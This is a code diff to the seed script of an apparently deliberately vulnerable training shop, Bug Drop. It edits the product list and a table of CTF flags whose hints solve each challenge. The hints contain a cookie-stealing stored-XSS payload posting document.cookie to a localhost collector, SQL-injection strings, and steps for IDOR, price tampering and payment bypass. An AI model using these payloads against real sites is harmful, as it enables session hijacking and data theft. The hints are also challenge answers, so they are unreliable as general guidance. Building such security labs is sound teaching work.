@@ -52,18 +52,19 @@ function runSeed(dbInstance = null) {
     `);
 
     const products = [
-      ['Bug Hacker', 'Dark hoodie, glowing green eyes, and a laptop covered in stickers. Series 01 · Ultra Rare.', 99, 'series-01', '🐛', 10, 1],
-      ['Bug Astronaut', 'Pressurized suit with a tiny golden visor. Ready for the moon. Series 01 · Rare.', 49, 'series-01', '🐛', 25, 1],
-      ['Bug Firefighter', 'Bright yellow coat and a tiny red helmet. Saves the day, every day. Series 01 · Common.', 29, 'series-01', '🐛', 150, 0],
-      ['Bug Aviator', 'Vintage leather jacket and pilot goggles. Always looking at the sky. Series 01 · Rare.', 49, 'series-01', '🐛', 60, 0],
-      ['Bug Chef', 'An 8-inch knife, leather apron, and a recipe nobody else knows. Series 01 · Common.', 29, 'series-01', '🐛', 100, 0],
-      ['Bug Detective', 'Sees everything. Knows everything. Never tells you how. Polished magnifying glass included. Series 01 · Rare.', 49, 'series-01', '🐛', 55, 0],
-      ['Bug Scientist', 'White lab coat, safety goggles, and three failed experiments a day. Very promising. Series 01 · Common.', 29, 'series-01', '🐛', 115, 0],
-      ['Bug Cowboy', 'Wide-brimmed hat, silver spurs, and a stare that needs no words. Series 01 · Common.', 29, 'series-01', '🐛', 120, 0],
-      ['Bug Samurai', 'Black lacquered armor, twin-blade katana, and a discipline the other Bugs cannot comprehend. Series 01 · Rare.', 49, 'series-01', '🐛', 45, 0],
-      ['Bug Wizard', 'Starry cape, crystal wand, and a hat from which things emerge that are better left unquestioned. Series 01 · Rare.', 49, 'series-01', '🐛', 50, 0],
-      ['Bug ???', '???', 999, 'secret', '🐛', 1, 1],
-    ];
+  ['Bug Hacker', 'Dark hoodie, glowing green eyes, and a laptop covered in stickers. Series 01 · Ultra Rare.', 99, 'series-01', '🐛', 10, 1],
+  ['Bug Aviator', 'Vintage leather jacket and pilot goggles. Always looking at the sky. Series 01 · Rare.', 49, 'series-01', '🐛', 60, 0],
+  ['Bug Robot', 'Titanium chassis, precise calculations, zero emotions. Series 01 · Rare.', 49, 'series-01', '🐛', 30, 0],
+  ['Bug Firefighter', 'Bright yellow coat and a tiny red helmet. Saves the day, every day. Series 01 · Common.', 29, 'series-01', '🐛', 150, 0],
+  ['Bug Astronaut', 'Pressurized suit with a tiny golden visor. Ready for the moon. Series 01 · Rare.', 49, 'series-01', '🐛', 25, 1],
+  ['Bug Chef', 'An 8-inch knife, leather apron, and a recipe nobody else knows. Series 01 · Common.', 29, 'series-01', '🐛', 100, 0],
+  ['Bug Detective', 'Sees everything. Knows everything. Never tells you how. Polished magnifying glass included. Series 01 · Rare.', 49, 'series-01', '🐛', 55, 0],
+  ['Bug Scientist', 'White lab coat, safety goggles, and three failed experiments a day. Very promising. Series 01 · Common.', 29, 'series-01', '🐛', 115, 0],
+  ['Bug Cowboy', 'Wide-brimmed hat, silver spurs, and a stare that needs no words. Series 01 · Common.', 29, 'series-01', '🐛', 120, 0],
+  ['Bug Samurai', 'Black lacquered armor, twin-blade katana, and a discipline the other Bugs cannot comprehend. Series 01 · Rare.', 49, 'series-01', '🐛', 45, 0],
+  ['Bug Wizard', 'Starry cape, crystal wand, and a hat from which things emerge that are better left unquestioned. Series 01 · Rare.', 49, 'series-01', '🐛', 50, 0],
+  ['Bug ???', '???', 999, 'secret', '🐛', 1, 1],
+];
 
     for (const p of products) {
       insertProduct.run(...p);
@@ -115,7 +116,7 @@ function runSeed(dbInstance = null) {
 
     const flags = [
       ['cart_manipulation', 'Free Drop (Cart Manipulation)', 'Acquire the Secret Bug ($999) for $0 or less.', 'easy', 'Prices should not be decided on the client side... What if the server blindly trusts what you send?', 'Intercept the POST /api/cart/checkout request with Burp Suite or DevTools. Find the "unit_price" in the JSON body and change it to 0.'],
-      ['stored_xss', 'Stolen Session (Stored XSS)', 'Steal the admin cookie (Admin) by injecting code into the product reviews.', 'medium', 'Product reviews are rendered without sanitization. What if you write something that is not just plain text?', 'Write a review with a payload like <script>fetch("http://localhost:9999?cookie="+document.cookie)</script>.'],
+      ['stored_xss', 'Stolen Session (Stored XSS)', 'Steal the admin cookie (Admin) by injecting code into the product reviews.', 'medium', 'Product reviews are rendered without sanitization. What if you write something that is not just plain text?', "Write a review with a payload like <img src=x onerror='fetch(\"http://localhost:3000/api/ctf/collector?c=\"+document.cookie)'>."],
       ['idor_orders', 'Leaked Molds (IDOR)', 'Read order #1 belonging to Admin containing the factory molds coordinates.', 'easy', 'When checking your own collection/orders, the URL has a numeric ID. Does the server verify that order belongs to you?', 'Make a GET request to /api/orders/1 while logged in as any other user. If there is no ownership validation, you will see Admin data.'],
       ['payment_bypass', 'Payment Bypass', 'Complete a purchase without paying by manipulating the payment status.', 'medium', 'The payment system trusts the client about the transaction result. Who actually validates if you paid?', 'Intercept the POST /api/orders/:id/pay request. The server accepts a JSON with {"status": "success"} without verifying with any payment processor. Send it directly.'],
       ['sqli_newsletter', 'Newsletter SQLi', 'Steal the admin exclusive coupon via the newsletter subscription form.', 'easy', 'The newsletter input is raw concatenated into the SQL query.', "Try putting `bugdrop_admin'--` or `admin' OR '1'='1` in the email input. Because the frontend uses type='text' instead of 'email', you can bypass HTML validation easily."],
